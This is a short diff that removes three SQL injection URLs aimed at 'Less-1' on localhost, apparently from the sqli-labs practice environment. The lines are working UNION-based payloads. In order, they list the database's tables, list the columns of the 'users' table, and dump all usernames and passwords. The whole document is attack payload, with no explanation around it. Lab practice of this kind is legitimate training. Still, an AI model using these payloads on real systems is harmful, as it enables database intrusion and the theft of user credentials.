@@ -1,3 +1,0 @@
-http://127.0.0.1/Less-1/?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
-http://127.0.0.1/Less-1/?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
-http://127.0.0.1/Less-1/?id=-1'union select 1,group_concat(password),group_concat(username) from users--+
